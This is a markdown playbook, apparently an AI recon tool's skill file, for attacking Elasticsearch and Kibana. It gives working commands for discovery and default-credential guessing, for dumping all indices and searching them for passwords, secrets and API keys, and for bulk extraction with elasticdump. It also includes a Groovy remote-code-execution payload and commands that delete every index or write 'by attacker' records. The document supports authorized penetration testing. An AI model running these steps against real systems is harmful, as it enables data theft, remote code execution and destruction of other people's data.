<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: elasticsearch
description: Security testing playbook for Elasticsearch covering unauthenticated access, data extraction, index enumeration, and Kibana security misconfigurations
---

# Elasticsearch Security Testing

Elasticsearch is notorious for misconfigured public access — billions of records have been exposed via open Elasticsearch instances. Attack surface: no authentication by default (old versions), full data extraction, Kibana admin access, and Groovy/Painless script injection.

---

## Reconnaissance

### Discovery

    # Port scanning
    nmap -p 9200,9300,5601 <target> -sV --open

    # Ports:
    # 9200  — Elasticsearch REST API (HTTP)
    # 9300  — Elasticsearch transport/cluster
    # 5601  — Kibana web interface

    # Shodan dorking:
    port:9200 elasticsearch
    product:"Elastic" port:9200

---

## Unauthenticated Access Check

    # Basic cluster info — if this works, no auth required
    curl -s http://<target>:9200/
    # Returns: cluster name, version, cluster UUID

    # Health check
    curl -s http://<target>:9200/_cluster/health?pretty

    # If auth required (Elasticsearch 8.x default):
    curl -u elastic:changeme http://<target>:9200/
    curl -u elastic:elastic http://<target>:9200/
    curl -u admin:admin http://<target>:9200/

---

## Index Enumeration

    # List all indices
    curl -s http://<target>:9200/_cat/indices?v
    curl -s http://<target>:9200/_cat/indices?h=index,docs.count,store.size

    # List indices matching pattern
    curl -s "http://<target>:9200/_cat/indices/user*?v"
    curl -s "http://<target>:9200/_cat/indices/log*?v"

    # High-value index names to look for:
    # users, accounts, customers, employees, orders, payments, credentials
    # logs, audit, access_log, firewall, siem
    # emails, messages, documents, files

    # Count documents in an index
    curl -s "http://<target>:9200/<index>/_count"

---

## Data Extraction

    # Get index mapping (field names and types — reveals schema)
    curl -s "http://<target>:9200/<index>/_mapping?pretty"

    # Get first 10 documents
    curl -s "http://<target>:9200/<index>/_search?pretty&size=10"

    # Get all documents (scroll for large indices):
    curl -s "http://<target>:9200/<index>/_search?size=10000&pretty"

    # Search for sensitive keywords across all indices:
    curl -s 'http://<target>:9200/_all/_search?q=password&pretty'
    curl -s 'http://<target>:9200/_all/_search?q=secret&pretty'
    curl -s 'http://<target>:9200/_all/_search?q=apikey&pretty'

    # Get a specific document by ID:
    curl -s "http://<target>:9200/<index>/_doc/<id>?pretty"

    # Get specific fields only:
    curl -s "http://<target>:9200/<index>/_search?pretty" -d '
    {
      "_source": ["username", "email", "password"],
      "query": {"match_all": {}}
    }'

---

## Cluster Information Disclosure

    # Cluster settings (may reveal auth/TLS config)
    curl -s "http://<target>:9200/_cluster/settings?pretty&include_defaults=true"

    # Node info (OS, JVM, network details)
    curl -s "http://<target>:9200/_nodes?pretty"
    curl -s "http://<target>:9200/_nodes/stats?pretty"

    # Shard allocation
    curl -s "http://<target>:9200/_cat/shards?v"

    # Pending tasks
    curl -s "http://<target>:9200/_cluster/pending_tasks?pretty"

    # Ingest pipelines (may contain credentials/endpoints)
    curl -s "http://<target>:9200/_ingest/pipeline?pretty"

    # Snapshots (backups — may be restorable)
    curl -s "http://<target>:9200/_snapshot?pretty"
    curl -s "http://<target>:9200/_snapshot/<repo>/_all?pretty"

---

## Kibana Exposure

    # Kibana web interface
    GET http://<target>:5601/

    # Kibana default credentials:
    elastic:changeme    (ES 5.x/6.x)
    elastic:elastic
    kibana:kibana

    # Kibana API (useful when Kibana is accessible):
    GET http://<target>:5601/api/status                    # Kibana version + status
    GET http://<target>:5601/api/saved_objects/_find?type=dashboard&per_page=100
    GET http://<target>:5601/api/saved_objects/_find?type=index-pattern

    # Kibana console (execute Elasticsearch queries directly):
    POST http://<target>:5601/api/console/proxy?path=/_cat/indices&method=GET

---

## Script Injection (Painless / Groovy)

Elasticsearch allows scripted queries — if user input reaches script context:

    # Painless script injection (Elasticsearch 5+):
    {
      "script": {
        "lang": "painless",
        "source": "Math.max(params.a, params.b)",
        "params": {"a": 1, "b": 2}
      }
    }

    # RCE attempts (sandboxed in modern ES, but test older versions):
    # Groovy (Elasticsearch 1.x/2.x — NOT sandboxed):
    curl -X POST "http://<target>:9200/_search" -d '
    {
      "size": 1,
      "query": {
        "filtered": {
          "query": {
            "match_all": {}
          }
        }
      },
      "script_fields": {
        "my_field": {
          "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",\"a string\".getClass()).invoke(java.lang.Math.class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")"
        }
      }
    }'

    # CVE-2014-3120 / CVE-2015-1427: Groovy sandbox escape → RCE
    nuclei -t cves/2014/CVE-2014-3120.yaml -u http://<target>:9200/

---

## Data Destruction / Modification

    # Delete an index (if write access)
    curl -X DELETE "http://<target>:9200/<index>"

    # Delete all data
    curl -X DELETE "http://<target>:9200/*"     # DESTRUCTIVE — confirm scope

    # Create/modify document (unauthorized write access):
    curl -X PUT "http://<target>:9200/<index>/_doc/1" -H 'Content-Type: application/json' -d '
    {"modified": "by attacker"}'

---

## Automated Scanning

    # esearch / elasticsearch-dump for bulk extraction
    elasticdump --input=http://<target>:9200/<index> --output=output/es_data.json --type=data

    # nuclei templates for ES:
    nuclei -t exposures/apis/elasticsearch.yaml -u http://<target>:9200/
    nuclei -t cves/ -tags elasticsearch -u http://<target>:9200/

    # Automated ES scanner:
    python3 -c "
    import requests, json
    base = 'http://<target>:9200'
    indices = requests.get(f'{base}/_cat/indices?format=json').json()
    for idx in indices:
        name = idx['index']
        count = idx.get('docs.count', 0)
        size = idx.get('store.size', '0')
        print(f'{name}: {count} docs, {size}')
    "

---

## Pro Tips

1. Elasticsearch 7.x and below have no authentication by default — check immediately
2. List indices first (`_cat/indices?v`) to identify the most valuable data before extracting
3. Search for sensitive keywords across all indices: `_all/_search?q=password`
4. Kibana on port 5601 often has weaker security than the ES API itself
5. Ingest pipelines may contain webhook URLs, credentials, or API keys
6. Snapshot repositories may point to S3 buckets — check for accessible backup files
7. Groovy scripting (ES 1.x/2.x) is completely unprotected — immediate RCE

## Summary

Elasticsearch testing = unauthenticated access check + `_cat/indices` listing + targeted data extraction via `_search`. Open Elasticsearch instances are the most common cause of massive data breaches. Always enumerate indices by name, extract mappings to understand the schema, then target sensitive indices (users, payments, logs). Search for `password`, `secret`, `token` across all indices with `_all/_search?q=password`.
